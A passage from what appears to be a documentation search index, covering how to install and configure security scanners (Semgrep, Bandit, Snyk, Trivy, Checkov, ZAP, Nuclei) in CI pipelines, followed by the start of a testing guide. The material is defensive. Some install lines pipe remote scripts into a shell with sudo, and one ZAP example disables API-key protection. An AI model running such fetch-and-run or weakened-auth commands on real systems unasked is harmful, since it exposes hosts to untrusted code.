reports\nsonar.python.coverage.reportPaths=coverage.xml\nsonar.javascript.lcov.reportPaths=coverage/lcov.info\n\n## Quality gate\nsonar.qualitygate.wait=true\n</code></pre> <p>Scan execution:</p> <pre><code>## Scan with properties file\nsonar-scanner\n\n## Scan with inline parameters\nsonar-scanner \\\n  -Dsonar.projectKey=my-project \\\n  -Dsonar.sources=src \\\n  -Dsonar.host.url=http://localhost:9000 \\\n  -Dsonar.login=your-token\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#semgrep","title":"Semgrep","text":"<p>Installation:</p> <pre><code>## Using pipx\npipx install semgrep\n\n## macOS\nbrew install semgrep\n\n## Verify\nsemgrep --version\n</code></pre> <p>Configuration (.semgrep.yml):</p> <pre><code>rules:\n  - id: python-sql-injection\n    languages: [python]\n    message: Potential SQL injection vulnerability\n    severity: ERROR\n    pattern: |\n      cursor.execute(f\"...\")\n    fix: Use parameterized queries\n\n  - id: javascript-eval-usage\n    languages: [javascript, typescript]\n    message: Avoid using eval()\n    severity: WARNING\n    pattern: eval(...)\n\n  - id: hardcoded-secret\n    languages: [python, javascript, typescript]\n    message: Potential hardcoded secret\n    severity: ERROR\n    pattern-either:\n      - pattern: password = \"...\"\n      - pattern: api_key = \"...\"\n      - pattern: secret = \"...\"\n</code></pre> <p>Scanning:</p> <pre><code>## Scan with default rules\nsemgrep --config=auto .\n\n## Scan with specific rulesets\nsemgrep --config=p/security-audit \\\n  --config=p/owasp-top-ten \\\n  --config=p/python \\\n  .\n\n## Scan with custom rules\nsemgrep --config=.semgrep.yml .\n\n## Generate SARIF report\nsemgrep --config=auto --sarif --output=semgrep.sarif .\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#bandit-python","title":"Bandit (Python)","text":"<p>Installation:</p> <pre><code>pipx install bandit\n</code></pre> <p>Configuration (.bandit):</p> <pre><code>## Bandit configuration\nexclude_dirs:\n  - /test\n  - /tests\n  - /.venv\n  - /venv\n\nskips:\n  - B101  # assert_used\n  - B601  # paramiko_calls\n\ntests:\n  - B201  # flask_debug_true\n  - B301  # pickle\n  - B302  # marshal\n  - B303  # md5\n  - B304  # insecure_cipher\n  - B305  # insecure_cipher_mode\n  - B306  # insecure_mktemp\n  - B307  # eval\n  - B308  # mark_safe\n  - B501  # request_with_no_cert_validation\n  - B502  # ssl_with_bad_version\n  - B503  # ssl_with_bad_defaults\n</code></pre> <p>Scanning:</p> <pre><code>## Scan directory\nbandit -r src/\n\n## Scan with config\nbandit -r src/ -c .bandit\n\n## Generate reports\nbandit -r src/ -f json -o bandit-report.json\nbandit -r src/ -f html -o bandit-report.html\n\n## Only show high severity\nbandit -r src/ -ll\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#eslint-security-plugins-javascripttypescript","title":"ESLint Security Plugins (JavaScript/TypeScript)","text":"<p>Installation:</p> <pre><code>npm install --save-dev \\\n  eslint-plugin-security \\\n  eslint-plugin-no-secrets \\\n  eslint-plugin-xss\n</code></pre> <p>.eslintrc.json:</p> <pre><code>{\n  \"plugins\": [\"security\", \"no-secrets\", \"xss\"],\n  \"extends\": [\"plugin:security/recommended\"],\n  \"rules\": {\n    \"security/detect-object-injection\": \"error\",\n    \"security/detect-non-literal-regexp\": \"warn\",\n    \"security/detect-unsafe-regex\": \"error\",\n    \"security/detect-buffer-noassert\": \"error\",\n    \"security/detect-child-process\": \"warn\",\n    \"security/detect-disable-mustache-escape\": \"error\",\n    \"security/detect-eval-with-expression\": \"error\",\n    \"security/detect-no-csrf-before-method-override\": \"error\",\n    \"security/detect-non-literal-fs-filename\": \"warn\",\n    \"security/detect-non-literal-require\": \"warn\",\n    \"security/detect-possible-timing-attacks\": \"warn\",\n    \"security/detect-pseudoRandomBytes\": \"error\",\n    \"no-secrets/no-secrets\": \"error\",\n    \"xss/no-mixed-html\": \"error\"\n  }\n}\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#software-composition-analysis-sca","title":"Software Composition Analysis (SCA)","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#snyk","title":"Snyk","text":"<p>Installation:</p> <pre><code>## npm\nnpm install -g snyk\n\n## Homebrew\nbrew install snyk\n\n## Authenticate\nsnyk auth\n\n## Verify\nsnyk --version\n</code></pre> <p>Scanning:</p> <pre><code>## Test dependencies\nsnyk test\n\n## Test and monitor\nsnyk monitor\n\n## Test with severity threshold\nsnyk test --severity-threshold=high\n\n## Test Docker image\nsnyk container test myapp:latest\n\n## Test infrastructure as code\nsnyk iac test terraform/\n</code></pre> <p>snyk.json configuration:</p> <pre><code>{\n  \"language-settings\": {\n    \"python\": {\n      \"targetFile\": \"requirements.txt\"\n    }\n  },\n  \"exclude\": {\n    \"global\": [\n      \"node_modules/**\",\n      \".venv/**\",\n      \"test/**\"\n    ]\n  },\n  \"severity-threshold\": \"medium\",\n  \"ignore-policy\": \".snyk\"\n}\n</code></pre> <p>.snyk policy file:</p> <pre><code>## Snyk policy file\nversion: v1.25.0\n\nignore:\n  # Ignore specific vulnerabilities\n  SNYK-PYTHON-REQUESTS-12345:\n    - '*':\n        reason: False positive\n        expires: 2025-12-31T00:00:00.000Z\n\n  # Ignore all low severity\n  '*':\n    - '*':\n        reason: Low severity\n        expires: 2025-12-31T00:00:00.000Z\n      severity: low\n\npatch: {}\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#owasp-dependency-check","title":"OWASP Dependency-Check","text":"<p>Installation:</p> <pre><code>## Download\nVERSION=9.0.9\nwget https://github.com/jeremylong/DependencyCheck/releases/download/v${VERSION}/dependency-check-${VERSION}-release.zip\nunzip dependency-check-${VERSION}-release.zip\nsudo mv dependency-check /opt/\nexport PATH=$PATH:/opt/dependency-check/bin\n\n## Verify\ndependency-check.sh --version\n</code></pre> <p>Scanning:</p> <pre><code>## Scan project\ndependency-check.sh \\\n  --project \"My Project\" \\\n  --scan ./src \\\n  --out ./reports \\\n  --format HTML \\\n  --format JSON\n\n## Scan with suppression file\ndependency-check.sh \\\n  --project \"My Project\" \\\n  --scan ./src \\\n  --suppression dependency-check-suppressions.xml \\\n  --out ./reports\n</code></pre> <p>dependency-check-suppressions.xml:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;suppressions xmlns=\"https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd\"&gt;\n  &lt;suppress&gt;\n    &lt;notes&gt;False positive&lt;/notes&gt;\n    &lt;cve&gt;CVE-2021-12345&lt;/cve&gt;\n  &lt;/suppress&gt;\n  &lt;suppress&gt;\n    &lt;notes&gt;Not applicable to our use case&lt;/notes&gt;\n    &lt;gav regex=\"true\"&gt;^org\\.example:.*:.*$&lt;/gav&gt;\n    &lt;cpe&gt;cpe:/a:example:library&lt;/cpe&gt;\n  &lt;/suppress&gt;\n&lt;/suppressions&gt;\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#safety-python","title":"Safety (Python)","text":"<p>Installation:</p> <pre><code>pipx install safety\n</code></pre> <p>Scanning:</p> <pre><code>## Check requirements file\nsafety check -r requirements.txt\n\n## Check installed packages\nsafety check\n\n## Check with policy file\nsafety check --policy-file .safety-policy.yml\n\n## Generate JSON report\nsafety check --json --output safety-report.json\n</code></pre> <p>.safety-policy.yml:</p> <pre><code>## Safety policy file\nsecurity:\n  # Ignore specific vulnerabilities\n  ignore-vulnerabilities:\n    - id: 12345\n      reason: False positive\n      expires: '2025-12-31'\n\n  # Ignore packages\n  ignore-packages:\n    - name: example-package\n      version: '1.0.0'\n      reason: Known issue, waiting for patch\n\n  # Severity threshold\n  continue-on-vulnerability-error: false\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#container-security","title":"Container Security","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#trivy","title":"Trivy","text":"<p>Installation:</p> <pre><code>## macOS\nbrew install aquasecurity/trivy/trivy\n\n## Ubuntu/Debian\nwget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | \\\n  sudo apt-key add -\necho \"deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main\" | \\\n  sudo tee -a /etc/apt/sources.list.d/trivy.list\nsudo apt update\nsudo apt install trivy\n\n## Verify\ntrivy --version\n</code></pre> <p>Scanning:</p> <pre><code>## Scan Docker image\ntrivy image myapp:latest\n\n## Scan with severity filter\ntrivy image --severity HIGH,CRITICAL myapp:latest\n\n## Scan filesystem\ntrivy fs .\n\n## Scan Git repository\ntrivy repo https://github.com/user/repo\n\n## Generate reports\ntrivy image --format json --output trivy-report.json myapp:latest\ntrivy image --format sarif --output trivy.sarif myapp:latest\n\n## Scan Kubernetes manifests\ntrivy k8s --report summary cluster\n</code></pre> <p>trivy.yaml configuration:</p> <pre><code>## Trivy configuration\nseverity:\n  - CRITICAL\n  - HIGH\n\nvulnerability:\n  type:\n    - os\n    - library\n\nscan:\n  skip-dirs:\n    - /test\n    - /tests\n\nexit-code: 1\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#grype","title":"Grype","text":"<p>Installation:</p> <pre><code>## macOS\nbrew install grype\n\n## Linux\ncurl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin\n\n## Verify\ngrype version\n</code></pre> <p>Scanning:</p> <pre><code>## Scan image\ngrype myapp:latest\n\n## Scan with output format\ngrype myapp:latest -o json &gt; grype-report.json\n\n## Scan directory\ngrype dir:.\n\n## Scan with fail on severity\ngrype myapp:latest --fail-on high\n</code></pre> <p>.grype.yaml:</p> <pre><code>## Grype configuration\noutput: json\n\nfail-on-severity: high\n\nignore:\n  - vulnerability: CVE-2021-12345\n    fix-state: wont-fix\n    package:\n      name: example-package\n      version: 1.0.0\n\nregistry:\n  insecure-skip-tls-verify: false\n  insecure-use-http: false\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#hadolint-dockerfile","title":"Hadolint (Dockerfile)","text":"<p>Configuration (.hadolint.yaml):</p> <pre><code>ignored:\n  - DL3008  # Pin versions in apt-get install\n  - DL3009  # Delete apt-get lists after installing\n  - DL3018  # Pin versions in apk add\n\ntrustedRegistries:\n  - docker.io\n  - gcr.io\n  - ghcr.io\n  - quay.io\n\nfailure-threshold: warning\n\noverride:\n  error:\n    - DL3001  # HTTPS for registry\n  warning:\n    - DL3002  # Last USER should not be root\n  info:\n    - DL3032  # yum clean\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#infrastructure-security","title":"Infrastructure Security","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#checkov","title":"Checkov","text":"<p>Installation:</p> <pre><code>pipx install checkov\n</code></pre> <p>Scanning:</p> <pre><code>## Scan Terraform\ncheckov -d terraform/\n\n## Scan with specific framework\ncheckov --framework terraform -d terraform/\n\n## Scan CloudFormation\ncheckov --framework cloudformation -f template.yaml\n\n## Scan Kubernetes\ncheckov --framework kubernetes -f deployment.yaml\n\n## Generate reports\ncheckov -d terraform/ --output json --output-file checkov-report.json\ncheckov -d terraform/ --output sarif --output-file checkov.sarif\n\n## Skip specific checks\ncheckov -d terraform/ --skip-check CKV_AWS_1,CKV_AWS_2\n</code></pre> <p>.checkov.yaml:</p> <pre><code>## Checkov configuration\nframework:\n  - terraform\n  - cloudformation\n  - kubernetes\n  - dockerfile\n\nskip-check:\n  - CKV_AWS_1\n  - CKV_AWS_2\n\nsoft-fail: false\n\noutput: cli\n\ncompact: false\n\nquiet: false\n\ndirectory:\n  - terraform/\n  - cloudformation/\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#tfsec","title":"tfsec","text":"<p>Installation:</p> <pre><code>## macOS\nbrew install tfsec\n\n## Linux\nwget https://github.com/aquasecurity/tfsec/releases/download/v1.28.4/tfsec-linux-amd64\nchmod +x tfsec-linux-amd64\nsudo mv tfsec-linux-amd64 /usr/local/bin/tfsec\n\n## Verify\ntfsec --version\n</code></pre> <p>Scanning:</p> <pre><code>## Scan Terraform directory\ntfsec .\n\n## Scan with severity filter\ntfsec --minimum-severity HIGH .\n\n## Generate reports\ntfsec --format json --out tfsec-report.json .\ntfsec --format sarif --out tfsec.sarif .\n\n## Run specific checks\ntfsec --include-passed --include-ignored .\n</code></pre> <p>tfsec.json configuration:</p> <pre><code>{\n  \"severity_overrides\": {\n    \"aws-s3-enable-versioning\": \"HIGH\"\n  },\n  \"exclude\": [\n    \"aws-vpc-no-public-ingress-sgr\"\n  ],\n  \"minimum_severity\": \"MEDIUM\"\n}\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#terrascan","title":"Terrascan","text":"<p>Installation:</p> <pre><code>## macOS\nbrew install terrascan\n\n## Linux\ncurl -L \"$(curl -s https://api.github.com/repos/tenable/terrascan/releases/latest | \\\n  grep -o -E 'https://.+?_Linux_x86_64.tar.gz')\" &gt; terrascan.tar.gz\ntar -xf terrascan.tar.gz terrascan\nsudo mv terrascan /usr/local/bin/\n\n## Verify\nterrascan version\n</code></pre> <p>Scanning:</p> <pre><code>## Scan Terraform\nterrascan scan -t terraform -d .\n\n## Scan with specific policy\nterrascan scan -t terraform -p aws -d .\n\n## Generate reports\nterrascan scan -t terraform -d . -o json &gt; terrascan-report.json\nterrascan scan -t terraform -d . -o sarif &gt; terrascan.sarif\n\n## Skip rules\nterrascan scan -t terraform -d . --skip-rules AWS.S3Bucket.DS.High.1043\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#dynamic-application-security-testing-dast","title":"Dynamic Application Security Testing (DAST)","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#owasp-zap","title":"OWASP ZAP","text":"<p>Installation:</p> <pre><code>## Docker\ndocker pull zaproxy/zap-stable\n\n## Run ZAP in daemon mode\ndocker run -u zap -p 8080:8080 \\\n  -d zaproxy/zap-stable \\\n  zap.sh -daemon -host 0.0.0.0 -port 8080 \\\n  -config api.disablekey=true\n</code></pre> <p>Baseline scan:</p> <pre><code>## Baseline scan\ndocker run -v $(pwd):/zap/wrk/:rw \\\n  zaproxy/zap-stable \\\n  zap-baseline.py \\\n  -t https://example.com \\\n  -r zap-baseline-report.html\n\n## Full scan\ndocker run -v $(pwd):/zap/wrk/:rw \\\n  zaproxy/zap-stable \\\n  zap-full-scan.py \\\n  -t https://example.com \\\n  -r zap-full-report.html\n\n## API scan\ndocker run -v $(pwd):/zap/wrk/:rw \\\n  zaproxy/zap-stable \\\n  zap-api-scan.py \\\n  -t https://api.example.com/openapi.json \\\n  -f openapi \\\n  -r zap-api-report.html\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#nuclei","title":"Nuclei","text":"<p>Installation:</p> <pre><code>## Go install\ngo install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest\n\n## Verify\nnuclei -version\n</code></pre> <p>Scanning:</p> <pre><code>## Update templates\nnuclei -update-templates\n\n## Scan target\nnuclei -u https://example.com\n\n## Scan with severity filter\nnuclei -u https://example.com -severity critical,high\n\n## Scan with specific templates\nnuclei -u https://example.com -t cves/ -t vulnerabilities/\n\n## Generate report\nnuclei -u https://example.com -json -o nuclei-report.json\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#compliance-scanning","title":"Compliance Scanning","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#openscap","title":"OpenSCAP","text":"<p>Installation:</p> <pre><code>## Ubuntu/Debian\nsudo apt install libopenscap8 openscap-scanner\n\n## RHEL/CentOS\nsudo yum install openscap-scanner\n</code></pre> <p>Scanning:</p> <pre><code>## Scan system\nsudo oscap xccdf eval \\\n  --profile xccdf_org.ssgproject.content_profile_pci-dss \\\n  --results scan-results.xml \\\n  --report scan-report.html \\\n  /usr/share/xml/scap/ssg/content/ssg-ubuntu2004-ds.xml\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#chef-inspec","title":"Chef InSpec","text":"<p>Installation:</p> <pre><code>## macOS/Linux\ncurl https://omnitruck.chef.io/install.sh | sudo bash -s -- -P inspec\n\n## Verify\ninspec --version\n</code></pre> <p>Profile example:</p> <pre><code>## controls/example.rb\ncontrol 'ssh-config' do\n  impact 1.0\n  title 'SSH Configuration'\n  desc 'Ensure SSH is configured securely'\n\n  describe sshd_config do\n    its('PermitRootLogin') { should eq 'no' }\n    its('PasswordAuthentication') { should eq 'no' }\n    its('Protocol') { should eq '2' }\n  end\nend\n</code></pre> <p>Scanning:</p> <pre><code>## Run profile\ninspec exec /path/to/profile\n\n## Run with reporter\ninspec exec /path/to/profile --reporter json:inspec-report.json\n\n## Run remote\ninspec exec /path/to/profile -t ssh://user@host\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#cicd-integration","title":"CI/CD Integration","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#github-actions","title":"GitHub Actions","text":"<pre><code>name: Security Scans\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n  schedule:\n    - cron: '0 0 * * 0'  # Weekly\n\njobs:\n  secret-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: TruffleHog Secret Scan\n        uses: trufflesecurity/trufflehog@main\n        with:\n          path: ./\n          base: ${{ github.event.repository.default_branch }}\n          head: HEAD\n\n  sast:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Semgrep\n        uses: returntocorp/semgrep-action@v1\n        with:\n          config: &gt;-\n            p/security-audit\n            p/owasp-top-ten\n\n  dependency-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run Snyk\n        uses: snyk/actions/node@master\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n        with:\n          args: --severity-threshold=high\n\n  container-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: docker build -t myapp:${{ github.sha }} .\n\n      - name: Trivy scan\n        uses: aquasecurity/trivy-action@master\n        with:\n          image-ref: myapp:${{ github.sha }}\n          format: 'sarif'\n          output: 'trivy-results.sarif'\n          severity: 'CRITICAL,HIGH'\n\n      - name: Upload Trivy results\n        uses: github/codeql-action/upload-sarif@v2\n        with:\n          sarif_file: 'trivy-results.sarif'\n\n  infrastructure-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Checkov\n        uses: bridgecrewio/checkov-action@master\n        with:\n          directory: terraform/\n          framework: terraform\n          output_format: sarif\n          output_file_path: checkov.sarif\n\n      - name: Upload Checkov results\n        uses: github/codeql-action/upload-sarif@v2\n        with:\n          sarif_file: checkov.sarif\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#gitlab-ci","title":"GitLab CI","text":"<pre><code>stages:\n  - security\n\nsecret-scan:\n  stage: security\n  image: trufflesecurity/trufflehog:latest\n  script:\n    - trufflehog filesystem . --json --fail\n\nsast:\n  stage: security\n  image: returntocorp/semgrep:latest\n  script:\n    - semgrep --config=auto --sarif --output=semgrep.sarif .\n  artifacts:\n    reports:\n      sast: semgrep.sarif\n\ndependency-scan:\n  stage: security\n  image: snyk/snyk:python\n  script:\n    - snyk test --severity-threshold=high --json &gt; snyk-report.json || true\n  artifacts:\n    reports:\n      dependency_scanning: snyk-report.json\n\ncontainer-scan:\n  stage: security\n  image: aquasec/trivy:latest\n  script:\n    - trivy image --severity HIGH,CRITICAL --format sarif --output trivy.sarif $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA\n  artifacts:\n    reports:\n      container_scanning: trivy.sarif\n\niac-scan:\n  stage: security\n  image: bridgecrew/checkov:latest\n  script:\n    - checkov -d terraform/ --framework terraform --output sarif --output-file checkov.sarif\n  artifacts:\n    reports:\n      sast: checkov.sarif\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#jenkins","title":"Jenkins","text":"<pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Security Scans') {\n            parallel {\n                stage('Secret Scan') {\n                    steps {\n                        sh '''\n                            docker run --rm -v $(pwd):/scan \\\n                                trufflesecurity/trufflehog:latest \\\n                                filesystem /scan --json --fail\n                        '''\n                    }\n                }\n\n                stage('SAST') {\n                    steps {\n                        sh '''\n                            docker run --rm -v $(pwd):/src \\\n                                returntocorp/semgrep:latest \\\n                                semgrep --config=auto /src\n                        '''\n                    }\n                }\n\n                stage('Dependency Scan') {\n                    steps {\n                        sh '''\n                            snyk test --severity-threshold=high \\\n                                --json &gt; snyk-report.json || true\n                        '''\n                        archiveArtifacts artifacts: 'snyk-report.json'\n                    }\n                }\n\n                stage('Container Scan') {\n                    steps {\n                        sh '''\n                            trivy image --severity HIGH,CRITICAL \\\n                                --format json \\\n                                --output trivy-report.json \\\n                                myapp:${GIT_COMMIT}\n                        '''\n                        archiveArtifacts artifacts: 'trivy-report.json'\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#security-policies","title":"Security Policies","text":"","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#securitytxt","title":"Security.txt","text":"<p>Place in <code>/.well-known/security.txt</code>:</p> <pre><code>Contact: security@example.com\nExpires: 2026-12-31T23:59:59.000Z\nEncryption: https://example.com/pgp-key.txt\nAcknowledgments: https://example.com/security-hall-of-fame\nPreferred-Languages: en\nCanonical: https://example.com/.well-known/security.txt\nPolicy: https://example.com/security-policy\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#vulnerability-disclosure-policy","title":"Vulnerability Disclosure Policy","text":"<pre><code>## Vulnerability Disclosure Policy\n\n## Reporting\n\nPlease report security vulnerabilities to: security@example.com\n\nInclude:\n- Description of the vulnerability\n- Steps to reproduce\n- Potential impact\n- Suggested fixes (optional)\n\n## Response Timeline\n\n- **24 hours**: Initial response\n- **7 days**: Preliminary assessment\n- **30 days**: Fix development\n- **90 days**: Public disclosure\n\n## Safe Harbor\n\nWe will not pursue legal action against researchers who:\n- Make good faith efforts to comply with this policy\n- Do not access or modify user data\n- Do not disrupt our services\n</code></pre>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/security_scanning_guide/#resources","title":"Resources","text":"<ul> <li>OWASP Top 10</li> <li>CWE Top 25</li> <li>NIST Security Guidelines</li> <li>Cloud Security Alliance</li> </ul> <p>Next Steps:</p> <ul> <li>Review the AI Validation Pipeline for complete CI/CD security integration</li> <li>See Pre-commit Hooks Guide for local security checks</li> <li>Check GitHub Actions Guide for security workflows</li> </ul>","tags":["security","scanning","sast","dast","sca","secrets","vulnerabilities","compliance"]},{"location":"05_ci_cd/testing_strategies/","title":"Testing Strategies Documentation","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#introduction","title":"Introduction","text":"<p>This guide provides comprehensive testing strategies and best practices for all supported languages and frameworks. It covers unit testing, integration testing, end-to-end testing, performance testing, and continuous testing in CI/CD pipelines.</p>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Testing Pyramid</li> <li>Unit Testing</li> <li>Integration Testing</li> <li>End-to-End Testing</li> <li>Performance Testing</li> <li>Security Testing</li> <li>Test Automation</li> <li>CI/CD Integration</li> <li>Best Practices</li> </ol>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#testing-pyramid","title":"Testing Pyramid","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#concept","title":"Concept","text":"<pre><code>        /\\\n       /  \\\n      / E2E \\\n     /________\\\n    /          \\\n   / Integration\\\n  /______________\\\n /                \\\n/   Unit Tests     \\\n/____________________\\\n</code></pre> <p>Distribution:</p> <ul> <li>Unit Tests: 70% - Fast, isolated, test individual components</li> <li>Integration Tests: 20% - Test component interactions</li> <li>E2E Tests: 10% - Test complete user workflows</li> </ul>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#benefits","title":"Benefits","text":"<ul> <li>Fast Feedback: Unit tests run quickly, catching issues early</li> <li>Cost Efficiency: Unit tests are cheaper to write and maintain</li> <li>Reliability: Pyramid structure provides stable, maintainable test suite</li> <li>Coverage: Comprehensive coverage across all layers</li> </ul>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#unit-testing","title":"Unit Testing","text":"","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#python-pytest","title":"Python (pytest)","text":"<p>Installation:</p> <pre><code>pip install pytest pytest-cov pytest-mock pytest-asyncio\n</code></pre> <p>Example test:</p> <pre><code>## tests/test_calculator.py\nimport pytest\nfrom src.calculator import Calculator\n\nclass TestCalculator:\n    \"\"\"Test suite for Calculator class.\"\"\"\n\n    @pytest.fixture\n    def calculator(self):\n        \"\"\"Fixture to create Calculator instance.\"\"\"\n        return Calculator()\n\n    def test_add(self, calculator):\n        \"\"\"Test addition operation.\"\"\"\n        result = calculator.add(2, 3)\n        assert result == 5\n\n    def test_divide(self, calculator):\n        \"\"\"Test division operation.\"\"\"\n        result = calculator.divide(10, 2)\n        assert result == 5\n\n    def test_divide_by_zero(self, calculator):\n        \"\"\"Test division by zero raises ValueError.\"\"\"\n        with pytest.raises(ValueError, match=\"Cannot divide by zero\"):\n            calculator.divide(10, 0)\n\n    @pytest.mark.parametrize(\"a,b,expected\", [\n        (1, 1, 2),\n        (2, 3, 5),\n        (-1, 1, 0),\n        (0, 0, 0),\n    ])\n    def test_add_parametrized(self, calculator, a, b, expected):\n        \"\"\"Test addition with multiple inputs.\"\"\"\n        assert calculator.add(a, b) == expected\n</code></pre> <p>pytest.ini:</p> <pre><code>[pytest]\ntestpaths = tests\npython_files = test_*.py\npython_classes = Test*\npython_functions = test_*\naddopts =\n    -v\n    --strict-markers\n    --cov=src\n    --cov-report=html\n    --cov-report=term-missing\n    --cov-fail-under=80\nmarkers =\n    slow: marks tests as slow\n    integration: marks tests as integration tests\n    unit: marks tests as unit tests\n</code></pre> <p>Run tests:</p> <pre><code>## Run all tests\npytest\n\n## Run with coverage\npytest --cov=src --cov-report=html\n\n## Run specific test\npytest tests/test_calculator.py::TestCalculator::test_add\n\n## Run with markers\npytest -m unit\npytest -m \"not slow\"\n\n## Run in parallel\npytest -n auto\n</code></pre>","tags":["testing","unit-tests","integration-tests","e2e","performance","automation","tdd","bdd"]},{"location":"05_ci_cd/testing_strategies/#javascripttypescript-jest","title":"JavaScript/TypeScript (Jest)","text":"<p>Installation:</p> <pre><code>npm install --save-dev jest @types/jest ts-jest @testing-library/jest-dom\n</code></pre> <p>jest.config.js:</p> <pre><code>module.exports = {\n  preset: 'ts-jest',\n  testEnvironment: 'node',\n  roots: ['&lt;rootDir&gt;/src', '&lt;rootDir&gt;/tests'],\n  testMatch: ['**/__tests__/**/*.ts', '**/?(*.)+(spec|test).ts'],\n  transform: {\n    '^.+\\\\.ts$': 'ts-jest',\n  },\n  collectCoverageFrom: [\n    'src/**/*.ts',\n    '!src/**/*.d.ts',\n    '!src/**/*.spec.ts',\n  ],\n  coverageThreshold: {\n    global: {\n      branches: 80,\n      functions: 80,\n      lines: 80,\n      statements: 80,\n    },\n  },\n  setupFilesAfterEnv: ['&lt;rootDir&gt;/tests/setup.ts'],\n};\n</code></pre> <p>Example test:</p> <pre><code>// tests/calculator.test.ts\nimport { Calculator } from '../src/calculator';\n\ndescribe('Calculator', () =&gt; {\n  let calculator: Calculator;\n\n  beforeEach(() =&gt; {\n    calculator = new Calculator();\n  